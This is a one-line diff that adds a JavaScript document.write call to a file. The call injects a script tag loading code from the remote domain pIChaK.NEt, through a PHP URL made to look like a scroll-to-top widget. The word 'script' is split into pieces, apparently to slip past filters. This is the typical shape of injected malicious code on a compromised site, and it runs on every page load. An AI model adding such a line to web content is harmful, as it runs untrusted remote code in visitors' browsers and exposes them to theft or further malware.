@@ -1,0 +1,1 @@
+document.write ("<scr"+"ipt type='text/javascript' src='http://pIChaK.NEt/upper/scrolltopcontrol.php?t=22' ></s"+"cript>");
